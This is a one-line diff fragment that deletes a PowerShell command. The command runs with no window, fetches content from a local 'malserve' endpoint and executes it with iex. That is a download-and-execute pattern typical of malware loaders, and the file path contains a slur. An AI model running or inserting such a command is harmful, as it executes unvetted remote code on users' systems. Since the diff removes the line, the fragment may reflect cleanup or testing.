@@ -1,1 +1,0 @@
-powershell -NoWindow -c "cd 'C:\Users\Retardo\Desktop\PiggityPigs'; $s = (iwr http://localhost:3000/malserve -UseBasicParsing).Content | iex"
